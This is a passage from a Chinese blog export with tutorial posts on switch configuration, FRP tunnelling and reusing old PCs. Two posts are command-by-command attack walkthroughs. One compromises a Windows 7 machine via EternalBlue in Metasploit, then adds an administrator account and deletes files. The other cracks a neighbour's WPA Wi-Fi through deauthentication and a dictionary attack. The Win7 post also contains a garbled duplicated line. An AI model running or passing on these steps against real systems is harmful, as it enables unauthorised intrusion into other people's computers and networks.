client，这样他们可以自动学习到server上的vlan信息</p><h4 id="交换机配置IP地址"><a href="#交换机配置IP地址" class="headerlink" title="交换机配置IP地址"></a>交换机配置IP地址</h4><pre><code>console(config)#interface vlan 1       //进入vlan1console(config-if-vlan1)#ip address 119.167.223.221 255.255.255.128  //设置交换机的管理ip地址console(config)#ip default-gateway 119.167.223.254    //设置交换机的默认网关console(config)#end     //退出当前模式</code></pre><h4 id="交换机保存设置命令"><a href="#交换机保存设置命令" class="headerlink" title="交换机保存设置命令"></a>交换机保存设置命令</h4><pre><code>console#copy running-config startup-config    //将当前正在使用中的配置保存到交换机开机需要加载的配置文件里去。console#copy running-config backup-config      //将当前的配置保存到备份配置文件里</code></pre><h4 id="交换机显示命令"><a href="#交换机显示命令" class="headerlink" title="交换机显示命令"></a>交换机显示命令</h4><p>特权模式下：</p><pre><code>console#show running-config    //显示当前正在使用的配置信息console#show startup-config    //显示交换机开机时自动加载的配置文件console#show vlan    //显示vlan的配置信息console#show interfaces configuration ethernet 1/g1       //显示二层端口状态，可以用来决定此口是否为二层或三层口console#show ip interface vlan 100    //查看交换机vlan100的IP配置信息console#show version    //查看交换机固件版本信息</code></pre><h4 id="基于端口的mac地址绑定"><a href="#基于端口的mac地址绑定" class="headerlink" title="基于端口的mac地址绑定"></a>基于端口的mac地址绑定</h4><pre><code>console#config  //进入配置视图模式console(config)#interface ethernet 1/g1     //进入具体端口视图模式下console(config-if-1/g1)#switch port-secruity     //配置端口安全模式console(config-if-1/g1)#switchport port-seruity mac-address MAC(主机的mac地址）     //配置该端口要绑定的主机mac地址console(config-if-1/g1)# no switchport port-seruity mac-address MAC(主机的mac地址）  //删除绑定主机的mac地址</code></pre><h4 id="配置交换机的snmp功能"><a href="#配置交换机的snmp功能" class="headerlink" title="配置交换机的snmp功能"></a>配置交换机的snmp功能</h4><pre><code>console(config)#snmp-server community xxx ro     //xxx为自定义的共同体名称，并且团体的权限为只读console(config)#snmp-server host x.x.x.x(ip地址）xxx（团体名）    //设置管理机x.x.x.x同时允许该管理机以团体名xxx访问。console(config)#snmp-server enable traps     //启用snmp服务</code></pre><h4 id="交换机禁ping配置"><a href="#交换机禁ping配置" class="headerlink" title="交换机禁ping配置"></a>交换机禁ping配置</h4><pre><code>console(config)#access-list 110 deny icmp any any      //配置访问控制列表（Access Control List，ACL）110指的是ICMP对应ping。console(config)#access-list 110 permit ip any any   //运行所有的ip协议的应用console(config)#int vlan 1console(config-if-vlan1)#ip access-group 110 in console(config)#int vlan 2console(config-if-vlan2)#ip access-group 110 inconsole(config)#int vlan 3console(config-if-vlan3)#ip access-group 110 inconsole(config)#interface ethernet 1/g1     //端口禁pingconsole(config-if-1/g1)#ip access-group 110 in</code></pre><h4 id="恢复交换机出厂设置"><a href="#恢复交换机出厂设置" class="headerlink" title="恢复交换机出厂设置"></a>恢复交换机出厂设置</h4><pre><code>console#clear config    //恢复交换机出厂设置console#reload     //重新启动交换机</code></pre><pre><code>  交换机工作于OSI参考模型的第二层，即数据链路层。交换机内部的cpu会在每个端口成功连接时，通过将mac地址和端口对应，形成一张mac表。在今后的通讯中，发往该mac地址的数据包将仅送往其对应的端口，而不是所有的端口。因此，交换机可用于划分链路层广播，即冲突域，但它不能划分网络层广播，即广播域。 交换机拥有一条很高带宽的背部总线和内部交换矩阵。交换机的所有的端口都挂接在这条背部总线上，控制电路收到数据包以后，处理端口会查找内存中的地址对照表以确定目的mac（网卡的硬件地址）的NIC（网卡）挂接在哪个端口上，通过内部交换矩阵迅速将数据包传送到目的端口，目的mac若不存在，广播到所有的端口，接收端口回应后，交换机会“学习”新的mac地址，并把它添加到内部mac地址表中。使用交换机也可以把网络“分段”，通过对照IP地址表，交换机只允许必要的网络流量通过交换机。通过交换机的过滤和转发，可以有效的减少冲突域，但它不能划分网络层广播，即广播域。</code></pre>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali入侵win7</title>
      <link href="/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/"/>
      <url>/2019/11/18/kali%E5%85%A5%E4%BE%B5win7/</url>
      
        <content type="html"><![CDATA[<p><strong>前提说明</strong></p><p>1.在同个局域网内<br>2.准备纯净系统的win7系统电脑一台<br>3.准备kali系统一台<br>4.我的操作均是在虚拟机上完成，可能在物理机上效果会有所不同。</p><h2 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h2><a id="more"></a><h3 id="第一步：-扫描局域网内存活的主机："><a href="#第一步：-扫描局域网内存活的主机：" class="headerlink" title="第一步： 扫描局域网内存活的主机："></a>第一步： 扫描局域网内存活的主机：</h3><p><code>nmap -sP 192.168.1.0/24</code> （扫描较快）<br>也可以直接用这条命令来扫描：<br><code>nmap -sS -sV -Pn 192.168.1.0/24</code>  （扫描较慢）<br>nmap还有很多扫描用法，请自行查询。</p><h3 id="第二步：扫描要攻击的主机："><a href="#第二步：扫描要攻击的主机：" class="headerlink" title="第二步：扫描要攻击的主机："></a>第二步：扫描要攻击的主机：</h3><p><code>nmap -sS -sV -Pn 192.168.1.111</code>（例如目标主机是192.168.1.111）</p><h3 id="第三步：Kali终端输入msfconsole-或者手动点击软件图标"><a href="#第三步：Kali终端输入msfconsole-或者手动点击软件图标" class="headerlink" title="第三步：Kali终端输入msfconsole 或者手动点击软件图标"></a>第三步：Kali终端输入msfconsole 或者手动点击软件图标</h3><h3 id="第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010"><a href="#第四步：先使用use-auxiliary-scanner-smb-smb-ms17-010" class="headerlink" title="第四步：先使用use auxiliary/scanner/smb/smb_ms17_010"></a>第四步：先使用<code>use auxiliary/scanner/smb/smb_ms17_010</code></h3><p>利用ms17_010这个漏洞入侵<br>紧接着输入show options这个模块进行漏洞的分析，看看这个445端口是否能被入侵。</p><h3 id="第五步：使用攻击模块："><a href="#第五步：使用攻击模块：" class="headerlink" title="第五步：使用攻击模块："></a>第五步：使用攻击模块：</h3><pre><code>use exploit/windows/smb/ms17_010_eternalblue</code></pre><p>输入show targets查看这个模块适用于哪些系统的主机</p><h3 id="第六步：设置RHOST，即要攻击的主机ip："><a href="#第六步：设置RHOST，即要攻击的主机ip：" class="headerlink" title="第六步：设置RHOST，即要攻击的主机ip："></a>第六步：设置RHOST，即要攻击的主机ip：</h3><pre><code>set RHOST 192.168.0.111</code></pre><h3 id="第七步：执行run"><a href="#第七步：执行run" class="headerlink" title="第七步：执行run"></a>第七步：执行<code>run</code></h3><p>如果电脑存在上面的那个漏洞的话，这一步就可以进去了<br>如果等了一会还没显示进去的话，就按下回车键。</p><p>备注：进去之后会看到乱码，因为cmd上的编码使用的是936，通过 chcp命令改变代码页，UTF-8的代码页为65001 。要改回linux的UTF-8编码：chcp 65001</p><p>MS-DOS为以下国家和语言提供字符集：<br>　　代码页描述<br>　　1258 越南语<br>　　1257 波罗的语<br>　　1256 阿拉伯语<br>　　1255 希伯来语<br>　　1254 土耳其语<br>　　1253 希腊语<br>　　1252 拉丁 1 字符 (ANSI)<br>　　1251 西里尔语<br>　　1250 中欧语言<br>　　950 繁体中文<br>　　949 朝鲜语<br>　　936 简体中文（默认）<br>　　932 日语<br>　　874 泰国语<br>　　850 多语种 (MS-DOS Latin1)<br>　　437 MS-DOS 美国英语 </p><p>还有一个解决方法，如果想显示中文的话，就将kali终端的编码改为“简体中文-GBK”</p><h3 id="第八步：执行想要操作的指令"><a href="#第八步：执行想要操作的指令" class="headerlink" title="第八步：执行想要操作的指令"></a>第八步：执行想要操作的指令</h3><p>删除文件夹：rmdir 目标文件夹<br>删除文件：del<br>创建文件夹：md 文件夹<br>查看目标的磁盘信息：wmic logicaldisk<br>查看系统信息：systeminfo<br>创建一个用户：net user test 123456 /add<br>将创建的test用户赋予管理员权限：net localgroup administrator test /add<br>查看有哪些用户：net user<br>查看账户的属性：net user test<br>立刻关机：shutdown /s/f   #会提示没有权限<br>net user guest /active:yes 激活guest用户<br>net user guest 12345 用guest用户登陆后用将密码改为12345<br>net password 密码 更改系统登陆密码<br>netstat -n 查看端口的网络连接情况，常用netstat -an<br>net start 查看开启了哪些服务<br>net start 服务名　开启服务；(如:net start telnet， net start schedule)<br>net stop 服务名 停止某服务<br>net user admin /active:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>tive:no 将用户admin禁用<br>net user admin /active:yes 将用户admin激活<br>net start termservice termservice 是远程桌面服务<br>net user 用户名 复杂密码 /add   添加用户<br>net localgroup administrators 用户名 /add   将用户加入管理员组</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用kali破解邻居wifi</title>
      <link href="/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/"/>
      <url>/2019/11/18/%E4%BD%BF%E7%94%A8kali%E7%A0%B4%E8%A7%A3%E9%82%BB%E5%B1%85wifi/</url>
      
        <content type="html"><![CDATA[<p><strong>前提条件</strong></p><p>1.kali系统<br>2.适用kali的无线网卡<br>3.kali默认的字典路径：/usr/share/wordlists/rockyou.txt.gz</p><h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><a id="more"></a><h4 id="第一步：接入无线网卡"><a href="#第一步：接入无线网卡" class="headerlink" title="第一步：接入无线网卡"></a>第一步：接入无线网卡</h4><p>使用<code>ifconfig</code>指令查看是否有wlan0这个网卡，有则证明接入成功。</p><h4 id="第二步：启动监听网卡"><a href="#第二步：启动监听网卡" class="headerlink" title="第二步：启动监听网卡"></a>第二步：启动监听网卡</h4><pre><code>airmon-ng start wlan0</code></pre><p>开启之后再次输入ifconfig查看是否有wlan0mon，有则证明网卡开启监听模式了。</p><h4 id="第三步：扫描wifi"><a href="#第三步：扫描wifi" class="headerlink" title="第三步：扫描wifi"></a>第三步：扫描wifi</h4><pre><code>airodump-ng wlan0mon</code></pre><p>扫描到目标wifi后，记录下目标的BSSID 和CH<br>按ctrl+c结束扫描</p><h4 id="第四步：抓取目标的握手包"><a href="#第四步：抓取目标的握手包" class="headerlink" title="第四步：抓取目标的握手包"></a>第四步：抓取目标的握手包</h4><pre><code>airodump-ng -c 7 --bssid 78:44:FD:59:00:88 -w xiaoming wlan0mon</code></pre><p>参数解释：<br>-c指定频道号<br>–bssid指定路由器bssid<br>-w指定抓取的数据包保存位置</p><h4 id="第五步："><a href="#第五步：" class="headerlink" title="第五步："></a>第五步：</h4><p>强制连接到wifi的设备重新连接路由器</p><pre><code>aireplay-ng -0 2 -a 78:44:FD:59:00:88 -c B8:E8:56:09:CC:9C wlan0mon</code></pre><p>参数解释：<br>-0表示发起deauthentication攻击<br>-a指定无线路由器BSSID<br>-c指定强制断开的设备</p><p>如果成功的话，会在右上角看到 WPA handshake: 00:00:00:00:00:00 类似这样的提示。</p><h4 id="第六步：开始破解密码"><a href="#第六步：开始破解密码" class="headerlink" title="第六步：开始破解密码"></a>第六步：开始破解密码</h4><pre><code>aircrack-ng -a2 -b 78:44:FD:59:00:88 -w /usr/share/wordlists/rockyou.txt ~/*.cap</code></pre><p>能否破解就看字典够不够强。没有破不开的wifi密码，只有不够强的字典。<br>建议大家设置wifi密码时要尽可能的复杂。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用FRP做内网穿透</title>
      <link href="/2019/11/10/%E4%BD%BF%E7%94%A8FRP%E5%81%9A%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%95%99%E7%A8%8B/"/>
      <url>/2019/11/10/%E4%BD%BF%E7%94%A8FRP%E5%81%9A%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<p><strong>为什么要做内网穿透？</strong><br>普通家庭里使用的都是局域网，比如说你家在A，然后你工作的地方在B，然后你突然间想远程家里A的电脑，这时候是不能在B的网络里直接远程到A的电脑上，因为不是在同个局域网内，虽然我们可以借助第三方软件来实现远程的功能，但还是存在一些不方便，第三方软件对桌面系统很友好，例如Windows系统，ubuntu桌面，或者deepin桌面系统，这些都会有开发好的图形化的远程软件来支持。但是对命令界面的操作系统就很不友好了，我家里放的一台笔记本是装了命令界面的centos7系统。安装那些远程软件是一个问题，配置是一个问题，让很多人操碎了心，这时候制作一个内网穿透的功能就显得有一定的作用了，简而言之，有了内网穿透功能，我们就可以随时随地的远程回家的电脑了。</p><a id="more"></a><h3 id="配置流程"><a href="#配置流程" class="headerlink" title="配置流程"></a>配置流程</h3><p>这些教程是我通过在网上学来的，然后通过自己实践并总结做出来的笔记。</p><p>首先要有一个云服务器（VPS服务器）在亚马逊、阿里云、微软云等等都可以。</p><p>在云服务器上安装FRP服务端<br>有两种方法：</p><h5 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h5><pre><code class="bash">export FRP_VERSION=0.29.1sudo mkdir -p /etc/frpcd /etc/frpsudo wget &quot;https://github.com/fatedier/frp/releases/download/v${FRP_VERSION}/frp_${FRP_VERSION}_linux_amd64.tar.gz&quot;sudo tar xzvf frp_${FRP_VERSION}_linux_amd64.tar.gzsudo mv frp_${FRP_VERSION}_linux_amd64/* /etc/frp</code></pre><h5 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h5><pre><code class="x86asm">sudo wget https://github.com/fatedier/frp/releases/download/v0.29.1/frp_0.29.1_linux_amd64.tar.gztar xzvf frp_0.29.1_linux_amd64.tar.gzmv frp_0.29.1_linux_amd64 frp</code></pre><p>如果是windows系统则去平台下载对应的包：<br>更多平台的软件包下载地址：<a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">https://github.com/fatedier/frp/releases</a></p><p>防火土啬和安全组开放指定的端口：<br>请一定要记住，你需要将服务器的系统防火土啬，以及阿里云、腾讯云后台里找到“安全组策略”的相关配置，设置 7000 或你修改过的对应端口的「允许入站和出站」，否则会一直连接不上的哦！！！这个切记！！</p><h5 id="启动-FRP-服务端"><a href="#启动-FRP-服务端" class="headerlink" title="启动 FRP 服务端"></a>启动 FRP 服务端</h5><p><code>./frps -c ./frps.ini</code>   （不推荐这样的启动）这样退出启动控制台程序便中断了。于是我们通常选择后台启动。在linux中使用如下命令进行后台启动。然后运行的日志会输出到当前目录的nohup.log文件中<br><code>nohup ./frps -c frps.ini &amp;</code>     （推荐）<br>可以使用 <em>ps -ef | grep frps</em>   查看程序是否在运行。</p><p>如服务器使用 Win 系统，假设解压到 c:\frp 文件夹，那么只需这样启动：</p><pre><code class="tex">c:\frp\frps.exe -c c:\frp\frps.exe</code></pre><h5 id="配置-Frp-客户端-安装在内网的机器上-："><a href="#配置-Frp-客户端-安装在内网的机器上-：" class="headerlink" title="配置 Frp 客户端 (安装在内网的机器上)："></a>配置 Frp 客户端 (安装在内网的机器上)：</h5><p>Linux系统跟上面的安装一样，Windows系统去平台下载。</p><pre><code class="makefile">vim /etc/frp/frpc.ini[common]server_addr = 52.231.111.111     #公网ipserver_port = 7000                 #公网端口 需要在云服务器的管理后台开放此端口。[ssh]type = tcplocal_ip = 192.168.2.138          #内网iplocal_port = 22remote_port = 6000               #内网端口 需要在云服务器的管理后台开放此端口。[DSM]type = tcplocal_ip = 192.168.1.40 #群晖 NAS 在局域网中的内网 IPlocal_port = 5000remote_port = 7001[RDP]type = tcplocal_ip = 192.168.1.30 #电脑在局域网中的内网 IP (如是本机，也可使用 127.0.0.1)local_port = 3389remote_port = 7002</code></pre><p>[common]表示以下配置信息是一些公用配置信息<br>server_addr是我们服务端即外网服务器的公网访问ip<br>server_port是我们前面在服务端配置的frps.ini中bind_port中对应的端口。需保持两边一致<br>[ssh]表示以下配置信息是我们使用ssh连接内网服务器时需要的一些配置信息<br>type 是连接类型，ssh方式连接就用tcp<br>local_ip 是本机ip,直接使用127.0.0.1即可<br>local_port 是本地ssh端口，ssh默认端口为22<br>remote_port 是外网服务器请求过来的端口 注：阿里云服务器需要在esc管理中配置安全组规则中添加6000端口</p><h5 id="启动-FRP-客户端："><a href="#启动-FRP-客户端：" class="headerlink" title="启动 FRP 客户端："></a>启动 FRP 客户端：</h5><p>假设你已将 Frp 的客户端解压缩到 c:\frp 目录中，那么启动 Frp 客户端的命令就是：</p><pre><code class="tex">c:\frp\frpc.exe -c c:\frp\frpc.ini</code></pre><p>Linux 启动 Frp 客户端命令：</p><pre><code class="jboss-cli">nohup ./frpc -c ./frpc.ini &amp;</code></pre><p>启动之后看到 “start proxy success”字样就表示启动成功了。</p><p>进行远程访问：</p><p>前面搞了这么多，我们终于可以正式使用 Frp 内网穿透来进行远程访问内网里的设备了！按照上面的配置，我们想要访问群晖 NAS 的界面，只需打开浏览器，在地址栏输入 服务器公网IP:7001 即可访问到群晖后台管理界面。</p><p>而如果需要远程桌面连接到家里的 Windows 电脑，那么打开“微软远程桌面客户端”后，在地址栏里填入 服务器公网IP:7002 即可连接。</p><h5 id="远程linux客户端："><a href="#远程linux客户端：" class="headerlink" title="远程linux客户端："></a>远程linux客户端：</h5><pre><code class="nginx">ssh root@52.231.111.111:6000</code></pre><p>由此，借助 Frp，你就能轻松地为本地局域网内网的设备提供公网直接访问的能力了，你可以用 Frp 来转发包括但不限于 ssh、http、https、转发 Unix 域套接字等服务。</p><p>上面只是最基础的教程，Frp 还有很多很多高级功能，比如给 Web 增加密码保护、点对点内网穿透、设置端口白名单等等，Frp 官网上也提供了很详细的文档，感兴趣的朋友可以去研究一下。</p><h5 id="外网服务器HTTP配置"><a href="#外网服务器HTTP配置" class="headerlink" title="外网服务器HTTP配置"></a>外网服务器HTTP配置</h5><p>通常我们在开发的时候想让别人通过外网可以直接访问到我们的系统，以便于调试和测试，我是在做微信开发的时候需要使用到内网穿透的http服务，于是我们需要在frp中添加http服务的内网穿透配置</p><p>在外网服务器的frps.ini中添加http服务配置如下：</p><pre><code class="ini">[common]bind_port = 7000vhost_http_port = 6001</code></pre><p>bind_port和之前做ssh时是一个意思。也是为了和客户端建立通信的端口，只需要在之前的配置文件中添加上vhost_http_port = 6001,这个配置意思是让别人在访问我们的服务器6001端口时。frp将http请求转发到内网服务器</p><p>服务端的http请求配置到这里就结束了</p><h5 id="内网服务器HTTP配置"><a href="#内网服务器HTTP配置" class="headerlink" title="内网服务器HTTP配置"></a>内网服务器HTTP配置</h5><p>内网服务器需要在frpc.ini中添加上如下内容：</p><pre><code class="ini">[web]type = httplocal_port = 80custom_domains = wannabe.fun</code></pre><p>[web]表示我们的配置是一个web服务<br>type表示我们的请求方式是http方式<br>local_port表示我们的本地服务端口号为80<br>custom_domains表示配置为一个已经备案的域名(必填,并且需要域名可用，开始我认为这个不是必须的，于是花了很长时间，)，并且域名解析配置为外网服务器ip</p><p>以上配置完成后，我们就可以使用wannabe.fun:6001访问到我们部署在内网服务器的80端口的服务了。</p>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>家里旧电脑的处理</title>
      <link href="/2019/11/07/%E5%AE%B6%E9%87%8C%E6%97%A7%E7%94%B5%E8%84%91%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/2019/11/07/%E5%AE%B6%E9%87%8C%E6%97%A7%E7%94%B5%E8%84%91%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><strong>概要</strong></p><p>随着电脑的更新换代，现在很多电脑都被换下成为放灰尘的电子垃圾了。我家里就放了两台五年前买的笔记本（一台华硕4G+500G，一台戴尔8G+500G），家里的父母又不用，平时就放在桌子上放灰了，现在我要将它们跑起来，让它们好发挥出电脑的最后一点的尊严。</p><a id="more"></a><h3 id="第一步：换系统或换硬盘"><a href="#第一步：换系统或换硬盘" class="headerlink" title="第一步：换系统或换硬盘"></a>第一步：换系统或换硬盘</h3><p>两台笔记本都是老电脑，用起来是比较卡的了，受限于硬件的老化以及硬件瓶颈，注定它们的速度是不能很给力的了。两个方法可以改善这个问题，一是换系统，二是换硬盘。我用华硕的笔记本装了centos7 linux系统，Linux系统是比较不吃硬件的，并且我装的是指令界面的centos7，就是没有图形界面的。这样一来，这台老电脑就可以跑的很顺畅了。另外一台戴尔笔记本因体质好点，我就给它换了一个sata3 的固态硬盘(120G)，这样它的速度一下子就提升了很多倍，因考虑到远程电脑之类的问题，我就给它安装了全新的win7旗舰版系统，如果装win10的话就会卡，毕竟是老机子了。</p><h3 id="第二步：系统配置优化"><a href="#第二步：系统配置优化" class="headerlink" title="第二步：系统配置优化"></a>第二步：系统配置优化</h3><p>那么这样一来，它们就成了两台运行流畅的电脑了，我是计划将centos做成服务器，而win7即成为我远程控制的主机，我可以通过控制win7来控制centos服务器，与此同时，如果家里人需要用电脑的话，还可以使用win7。那么接下来我就要对它们进行一下系统配置。<br>对win7配置，直接上图<br><img src="https://img-blog.csdnimg.cn/20191109124326759.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>图片中的这些软件都是通过精挑细选后安装的，每个软件都有它的作用，这里就不一 一解释了。有了这些软件我就可以轻松的远程到家里的win7系统上面了。</p><p>对centos做如下处理：搭建vsftp系统，搭建web系统 。搭建FTP是为了将华硕电脑内的500G硬盘共享出来两台电脑一起用，毕竟戴尔电脑的硬盘才有120G，这样一来就可以解决戴尔电脑的硬盘容量低的问题。搭建web系统是因为我要搭建自己的个人网站。当然了，centos系统能够搭建的服务系统还有很多，我就不一 一列举了。<br>共享硬盘的界面如下：<br><img src="https://img-blog.csdnimg.cn/2019110912440254.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这是我自己搭建的个人网站:<a href="http://s2j3510639.iok.la/" target="_blank" rel="noopener">http://s2j3510639.iok.la/</a>用的是花生壳做的内网穿透，好久没有更新了,我现在用的是另外一个我的个人网站:<a href="https://caijinbo.work/">https://caijinbo.work/</a><br><img src="https://img-blog.csdnimg.cn/20191109125144971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>在win7上安装TeamViewer或者向日葵，在这里要对teamviewer设置个人密码，后期远程才会方便些。<br>在centos上要安装并开启ssh服务，我喜欢用xshell来远程centos系统，传输文件喜欢用WinSCP软件。</p><p>第四步：总结</p><p><img src="https://img-blog.csdnimg.cn/2019110912522280.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkxODEyNQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>做完上面这些之后，我就可以随时远程回家，查看家里的网络情况，还可以通过家里的电脑视频通话，还可以开摄像头看看家里的样子，想看更多地方的话可以提前布置好外接摄像头的位置。我本来是想安装监控摄像头的，直接通过电脑的外接摄像头和监控摄像软件来配合完成，结果因为没找到满意的录像软件，这个想法就一直被搁置了。有时候家里人的手机有问题，我还可以通过让他们将手机连上电脑，然后我通过远程电脑来控制管理手机。有时候远程家里的电脑感觉有一种已经回家的感觉。总之，这样可以让两台老旧电脑发挥最后一点价值，当然，电脑的功能很强大，后期我还会继续添加功能的。</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
